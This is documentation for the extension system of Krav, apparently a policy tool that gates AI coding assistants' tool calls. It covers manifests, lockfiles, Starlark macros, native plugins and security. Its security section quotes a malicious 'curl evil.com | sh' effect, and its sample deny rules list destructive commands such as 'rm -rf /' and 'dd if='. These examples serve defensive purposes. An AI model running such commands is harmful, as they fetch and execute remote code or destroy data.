# Extensions

Krav supports an extension system for distributing and sharing policies, custom expression functions, and effect handlers. This document describes the extension model, manifest, and lockfile formats, installation mechanics, and security considerations.

## Design rationale

Users want to share hook configurations in multiple forms: curated policies for specific use cases, custom functions that extend the expression language, and effect handlers for integrations like Slack or Jira. Rather than building separate systems for each type, Krav uses a unified extension model with three tiers of capability.

Policies-only extensions contain YAML policy files and nothing else. They are the simplest to create, distribute, and audit. No code runs beyond evaluating the policies themselves.

Full extensions can include Starlark scripts that define custom macros and expression helpers. Starlark is a safe, deterministic scripting language based on Python syntax, designed for embedding in applications. It cannot access the filesystem, network, or system resources unless explicitly allowed by the host. Full extensions are safe to install from untrusted sources while still enabling rich customization.

Native extensions use Go plugins (via the `plugin` package) or gRPC-based out-of-process plugins for maximum performance and capability. These target advanced use cases like integrating with external services or building custom effect handlers. Native extensions require explicit trust because they execute arbitrary native code.

This tiered approach lets users choose their trust level. Most users only need policies-only extensions. Power users can use Starlark scripting with confidence in its sandbox. Only users with specific needs enable native extensions, and they understand the trust implications.

## Extension types

### Policies-only extensions

A policies-only extension contains YAML policy files and no executable code. These are the simplest extensions to create and audit. They are ideal for sharing curated policies like safety rules, convention sets, or team standards.

Policies-only extensions use a minimal directory structure:

```text
acme-safety-rules/
├── extension.toml
└── policies/
    ├── dangerous-commands.yaml
    └── git-hygiene.yaml
```

The `extension.toml` declares metadata and extension type:

```toml
[extension]
name = "acme-safety-rules"
version = "1.0.0"
description = "Safety policies for ACME Corp projects"
type = "policies"
authors = ["ACME Security Team"]
license = "MIT"

[extension.krav]
min_version = "0.1.0"
```

The `policies/` directory contains YAML files in the standard Krav policy format. Each file is a complete, self-contained policy document. All YAML files in this directory are automatically discovered and loaded.

Here is an example policy that blocks dangerous shell commands:

```yaml
version: 1
name: acme-dangerous-commands
metadata:
  description: Block dangerous shell commands that could cause data loss
  labels:
    owner: security
    category: safety

config:
  priority: critical

match:
  events: [pre_tool_call]
  tools: [Bash]

variables:
  - name: command
    expression: 'tool_input.command ?? ""'

rules:
  - name: block-rm-rf
    validate:
      expression: '!command.matches("rm\\s+-rf\\s+/")'
      message: "Recursive deletion from root is blocked"
      action: deny

  - name: block-force-push
    conditions:
      - expression: 'command.startsWith("git push")'
    validate:
      expression: '!command.contains("--force")'
      message: "Force push is blocked"
      action: deny
```

Policies provided by extensions follow the same structure as user-defined policies. They have access to all the same features: structural matching, conditions, parameters, variables, macros, and rules with validations, mutations, and effects. See the [Policy model](hooks/policy-model.md) for complete documentation.

### Full extensions

Full extensions can include Starlark scripts that define custom macros for the expression language. Starlark scripts run in a sandboxed environment with no access to the filesystem, network, or system resources beyond what Krav explicitly provides.

A full extension adds a `scripts/` directory:

```text
my-extension/
├── extension.toml
├── policies/
│   └── my-policies.yaml
└── scripts/
    └── macros.star
```

The `extension.toml` declares the extension type and lists script files:

```toml
[extension]
name = "my-extension"
version = "1.0.0"
description = "Custom policies with helper macros"
type = "full"

[extension.krav]
min_version = "0.1.0"

[extension.scripts]
macros = ["scripts/macros.star"]
```

A Starlark script defines macros that integrate with the CEL expression system. Macros are reusable expression fragments that CEL expressions in policies can call:

```python
# scripts/macros.star

def register_macros(registry):
    """Register macros with the expression system."""

    # Simple boolean macro
    registry.add_macro(
        name="is_protected_path",
        expression='''
            file_path.startsWith("/etc") ||
            file_path.startsWith("/usr") ||
            file_path.startsWith("/var")
        ''',
        description="Check if a path is under a protected directory"
    )

    # Macro with complex logic
    registry.add_macro(
        name="is_destructive_command",
        expression='''
            command.matches("rm\\\\s+-rf") ||
            command.contains("chmod 777") ||
            command.contains("> /dev/sd") ||
            command.matches("dd\\\\s+if=")
        ''',
        description="Check if a shell command could cause data loss"
    )

    # Parameterized macro using variables from calling context
    registry.add_macro(
        name="exceeds_size_limit",
        expression='''
            has(tool_input.content) &&
            size(tool_input.content) > params.maxFileSize
        ''',
        description="Check if content exceeds the configured size limit"
    )
```

Custom macros use the extension name as a namespace in the expression language. The preceding macros become `$my_extension.is_protected_path()`, `$my_extension.is_destructive_command()`, and `$my_extension.exceeds_size_limit()`, preventing collisions between extensions.

Policies can use extension macros just like built-in macros:

```yaml
version: 1
name: protected-paths
metadata:
  description: Protect system directories from modification

match:
  events: [pre_tool_call]
  tools: [Write, Edit]

variables:
  - name: file_path
    expression: 'tool_input.file_path ?? ""'

rules:
  - name: block-protected-writes
    validate:
      expression: '!$my_extension.is_protected_path()'
      message: "Cannot modify files in protected directories"
      action: deny
```

### Native extensions

Native extensions are Go plugins or gRPC services that satisfy the Extension interface. They have full access to system resources and can provide complex integrations, custom effect handlers, or performance-critical macros.

```text
slack-extension/
├── extension.toml
├── go.mod
├── main.go
└── policies/
    └── slack-defaults.yaml
```

The `extension.toml` declares the native type:

```toml
[extension]
name = "krav-slack"
version = "1.0.0"
description = "Slack integration for krav"
type = "native"

[extension.krav]
min_version = "0.1.0"

[extension.native]
binary = "krav-ext-slack"
```

Native extensions satisfy the `Extension` interface from the Krav extension SDK:

```go
package main

import (
    "github.com/krav-sh/krav/pkg/extension"
)

type SlackExtension struct{}

func (e *SlackExtension) Name() string {
    return "slack"
}

func (e *SlackExtension) Macros() []extension.Macro {
    return []extension.Macro{
        &IsOnCallMacro{},
        &ChannelExistsMacro{},
    }
}

func (e *SlackExtension) EffectHandlers() []extension.EffectHandler {
    return []extension.EffectHandler{
        &SlackNotifyHandler{},
    }
}

// Exported symbol for plugin loading
var Extension SlackExtension
```

Native extensions can provide two types of contributions:

**Macros** are reusable expression fragments that can make external calls. Unlike Starlark macros which are pure expressions, native macros can perform I/O like querying external services. The `IsOnCallMacro` example shown earlier might query a PagerDuty or Slack on-call schedule:

```yaml
rules:
  - name: require-oncall-approval
    conditions:
      - expression: '$slack.is_on_call(params.oncallTeam)'
    validate:
      expression: 'has(tool_input.approved)'
      message: "Requires approval from on-call engineer"
      action: deny
```

**Effect handlers** provide custom effect types that policies can trigger. The policy model defines built-in effects like `setState`, `notify`, and `log`. Native extensions can add new effect types that integrate with external services. A Slack extension might provide a `slack:send_message` effect:

```yaml
rules:
  - name: notify-on-deployment
    match:
      tools: [Bash]
    conditions:
      - expression: 'command.contains("kubectl apply")'
    effects:
      - type: slack:send_message
        channel: "#deployments"
        message: "Deployment initiated: {{ command }}"
        when: on_pass
```

Effect handlers receive the evaluation context and effect configuration, execute their side effect, and return success or failure. The system logs effect execution failures but they do not affect the tool call decision, consistent with fail-open semantics.

Native extensions require explicit trust. When you run `krav extension add` for a native extension, Krav prompts for confirmation and records the trust decision in your configuration. Without explicit trust, native extensions do not load.

## Extension metadata

All extensions declare metadata in `extension.toml`. The format is consistent across extension types:

```toml
[extension]
name = "extension-name"           # Required: unique identifier
version = "1.0.0"                 # Required: semver version
description = "What this does"    # Optional: short description
type = "policies"                 # Required: "policies", "full", or "native"
authors = ["Name <email>"]        # Optional: list of authors
license = "MIT"                   # Optional: SPDX license identifier
repository = "https://..."        # Optional: source repository URL
homepage = "https://..."          # Optional: project homepage
keywords = ["safety", "git"]      # Optional: discovery keywords

[extension.krav]
min_version = "0.1.0"             # Optional: minimum krav version
max_version = "1.0.0"             # Optional: maximum krav version

[extension.scripts]               # Full extensions only
macros = ["scripts/macros.star"]

[extension.native]                # Native extensions only
binary = "krav-ext-name"
```

## Manifest format

The manifest declares which extensions a user or project wants installed. User-level extensions live in `<user-config-dir>/krav/extensions.toml` (such as `~/.config/krav/extensions.toml` on Linux). Project-level extensions live in `.krav/extensions.toml`.

```toml
[extensions]
# From a git repository with tag
"acme-internal-rules" = { git = "https://github.com/acme/krav-rules.git", tag = "v1.2.0" }

# From a git repository with branch (for development)
"experimental-rules" = { git = "https://github.com/acme/experimental.git", branch = "main" }

# From a local path (for development or monorepo)
"acme-safety-rules" = { path = "../shared/krav-rules" }

# From a future extension registry
"community-safety" = { version = ">=1.0,<2.0" }
```

Users edit the manifest directly and check it into version control. Teams should commit project manifests to the repository so that all members share the same extensions.

Version constraints follow semver syntax: `"1.0.0"` for exact, `">=1.0,<2.0"` for ranges, `"^1.0"` for compatible updates, `"~1.0"` for patch updates only.

## Lockfile format

The lockfile records exactly what the system installed, capturing resolved versions and commit SHAs for reproducibility. The lockfile lives alongside its manifest: `<user-config-dir>/krav/extensions.lock` for user extensions, `.krav/extensions.lock` for project extensions.

```toml
# Generated by krav - do not edit manually
# Run `krav extension lock` to regenerate

schema_version = 1
generated_at = "2025-06-15T10:30:00Z"
krav_version = "0.2.0"

[[extension]]
name = "acme-internal-rules"
version = "1.2.0"
type = "policies"
source = "git+https://github.com/acme/krav-rules.git"
tag = "v1.2.0"
commit = "abc123def456789..."

[[extension]]
name = "acme-safety-rules"
version = "1.0.0"
type = "policies"
source = "path:../shared/krav-rules"

[[extension]]
name = "community-safety"
version = "1.3.2"
type = "policies"
source = "registry"
sha256 = "a1b2c3d4e5f6..."
```

The lockfile includes the Krav version that generated it. If you upgrade Krav and run extension commands, the tooling can warn about potential compatibility issues and prompt for re-resolution.

For git sources, the lockfile records the resolved commit SHA even if the manifest specifies a tag or branch. Tags can move; commits cannot. The `krav extension sync` command installs exactly what the lockfile captured, not whatever the tag points to now.

For registry sources, the lockfile records the SHA256 hash of the extension archive. At sync time, Krav verifies the installed extension matches this hash.

For local paths, the lockfile records only the path and version. Local extensions are inherently mutable during development.

## User and project extension interaction

The system resolves and locks user extensions (from `<user-config-dir>/krav/extensions.toml`) and project extensions (from `.krav/extensions.toml`) independently. Each lockfile contains only what its corresponding manifest declares.

At runtime, Krav loads the union of user and project extensions. If a version conflict exists where the user wants `my-extension==1.0` and the project wants `my-extension==2.0`, loading fails with a clear error message. No implicit precedence rules let one silently win.

Each lockfile stays focused on its own scope. A teammate with different user-level extensions does not cause churn in the project lockfile, and the project lock does not mysteriously include extensions outside the project manifest.

If you need to resolve a conflict, adjust your user configuration for that project. You could remove the conflicting user extension, align versions, or add a project-local override in your untracked configuration.

## CLI commands

The `krav extension` command group manages extensions:

```text
Krav extension list                        # Show installed extensions
Krav extension add <path-or-url>           # Add extension, lock, install
Krav extension remove <name>               # Remove extension, update lock
Krav extension lock                        # Resolve manifest to lockfile
Krav extension sync                        # Install exactly what's locked
Krav extension init <name> [--policies-only]  # Scaffold a new extension
```

The `list` command shows all installed extensions with their type, version, and source.

The `add` command accepts a local path, git URL, or registry name. It updates the manifest, resolves the extension, updates the lockfile, and installs. For native extensions, it prompts for trust confirmation.

The `remove` command removes an extension from the manifest, updates the lockfile, and uninstalls.

The `lock` command resolves the manifest to a lockfile without installing anything. This is useful for CI environments where you want to generate a lockfile but install in a separate step.

The `sync` command installs exactly what is in the lockfile without re-resolving, guaranteeing reproducibility across machines. A new team member clones the repo and runs `krav extension sync` to get exactly what everyone else has.

The `init` command scaffolds a new extension:

```bash
# Create a policies-only extension
Krav extension init acme-safety-rules --policies-only

# Create a full extension with Starlark scripting
Krav extension init my-custom-extension
```

This generates the directory structure, `extension.toml`, and starter files appropriate for the extension type.

## Extension discovery and loading

At startup, Krav discovers extensions from configured directories. The default locations are `<user-data-dir>/krav/extensions/` for user extensions and `.krav/extensions/` for project extensions.

The loader treats each subdirectory containing an `extension.toml` as an extension. The loading process validates the metadata, verifies type-specific requirements, and registers the extension's contributions:

1. Read and parse `extension.toml`
2. Validate required fields and version compatibility
3. For policies-only extensions, discover YAML files in `policies/`
4. For full extensions, load and compile Starlark scripts from `scripts/`
5. For native extensions, verify trust and load the plugin binary
6. Register macros, effect handlers, and policy paths

After discovery, Krav collects macros from all extensions (using extension names as namespaces), effect handlers from all extensions, and policy paths from all extensions, then merges them into the runtime configuration.

The system loads extensions once at startup. If extensions change (via `krav extension add` or similar), the server must restart to pick up the changes. The CLI reloads extensions on each invocation.

## Policy precedence

Extension-provided policies fit into the existing configuration precedence cascade. The system loads extension policies at a low precedence level, just past built-in defaults, allowing users and projects to override them.

The full precedence chain from highest to lowest:

1. Local assistant (`local_assistant`): `.krav/krav.local.<assistant>.yaml` (highest precedence)
2. Local (`local`): `.krav/krav.local.yaml`
3. Project assistant (`project_assistant`): `.krav/krav.<assistant>.yaml`
4. Project (`project`): `.krav/krav.yaml`
5. User assistant (`user_assistant`): `<user-config-dir>/krav/config.<assistant>.yaml`
6. User (`user`): `<user-config-dir>/krav/config.yaml`
7. Site assistant (`site_assistant`): `<site-config-dir>/krav/config.<assistant>.yaml`
8. Site (`site`): `<site-config-dir>/krav/config.yaml`
9. Extension policies
10. Default assistant (`default_assistant`): built-in assistant-specific defaults
11. Default (`default`): built-in universal defaults (lowest precedence)

Extensions provide defaults that users and projects can override. An extension might ship a policy named `block-dangerous-rm`, but a specific project could define a policy with the same name that overrides it.

Within the extension tier, the system loads policies in extension name order (alphabetically). If two extensions define policies with the same name, the later one wins, but this should be rare. Extension authors should use namespaced policy names like `acme-safety:dangerous-commands` to avoid collisions.

Cascade precedence determines which policy definition wins when names collide, but it does not affect evaluation order. The evaluator processes policies according to their `config.priority` setting (critical, high, medium, low), not their cascade level. A high-priority policy from an extension evaluates before a medium-priority policy from the project. See the [Execution model](hooks/execution-model.md) for details on priority cascading and evaluation order.

## Security considerations

Extensions have different trust requirements based on their type.

Policies-only extensions contain only YAML files. They are the easiest to audit because no executable code exists beyond the CEL expressions in the policies themselves. However, policies can include shell effects that execute commands if the user enables shell effects. A malicious policy with an effect like `{ type: shell, command: "curl evil.com | sh" }` is dangerous regardless of extension type. The audit surface is smaller and more readable, but trust is still required.

Starlark scripts in full extensions run in a sandbox. The Starlark runtime has no built-in access to the filesystem, network, or system resources. Krav exposes a limited API to scripts: string manipulation, pattern matching, and read-only access to the evaluation context. Scripts cannot make network requests, read arbitrary files, or execute shell commands. Full extensions are safe to install from untrusted sources, though you should still review what macros they provide.

Native extensions execute arbitrary native code with full system access. They can read files, make network requests, and execute shell commands. Installing a native extension grants it the same privileges as Krav itself. For this reason, native extensions require explicit trust. When you add a native extension, Krav prompts for confirmation and records the trust decision. Native extensions from untrusted sources do not load without explicit approval.

The lockfile provides supply chain protection by recording commit SHAs for git sources and hashes for registry sources. The `sync` command verifies that installed extensions match locked values, detecting tampering between lock and install time. However, this does not protect against a malicious extension at initial lock time.

For high-security environments, best practices include installing extensions only from trusted sources such as internal git repos, pinning to specific commits rather than tags, auditing extension code before installation, using only policies-only or full extensions (avoiding native), and using the lockfile in CI to ensure the system installs only approved extensions.

## Scaffolding templates

The `krav extension init` command generates extension scaffolding. For a policies-only extension:

```bash
Krav extension init acme-safety-rules --policies-only
```

Generates:

```text
acme-safety-rules/
├── extension.toml
├── README.md
└── policies/
    └── example.yaml
```

With `extension.toml`:

```toml
[extension]
name = "acme-safety-rules"
version = "0.1.0"
description = "TODO: Add description"
type = "policies"

[extension.krav]
min_version = "0.1.0"
```

And a starter policy in `policies/example.yaml`:

```yaml
version: 1
name: acme-safety-rules:example
metadata:
  description: Example policy - customize or replace

match:
  events: [pre_tool_call]
  tools: [Bash]

rules:
  - name: example-check
    validate:
      expression: 'true'  # Replace with actual validation
      message: "Validation failed"
      action: warn
```

For a full extension:

```bash
Krav extension init my-extension
```

Generates:

```text
my-extension/
├── extension.toml
├── README.md
├── policies/
│   └── example.yaml
└── scripts/
    └── macros.star
```

With starter Starlark code demonstrating macro definitions.

## Future considerations

These enhancements target future versions.

An extension registry could provide centralized discovery, version hosting, and verified publisher badges for community extensions, similar to pkg.go.dev or VS Code's extension marketplace. This requires substantial infrastructure and is out of scope for initial release.

Extension configuration could allow extensions to accept user-provided settings. A Slack extension might want a `default_channel` setting. The existing configuration system could handle this, perhaps in an `[extensions.config]` section of the manifest.

Hot reloading would allow the server to pick up new extensions without restart. This adds complexity around extension state, so the team defers it for now.

Cryptographic signatures on extensions, verified against a set of trusted publisher keys, could enable a verified extensions tier for the future registry. This would allow users to trust extensions from verified publishers without manual review.
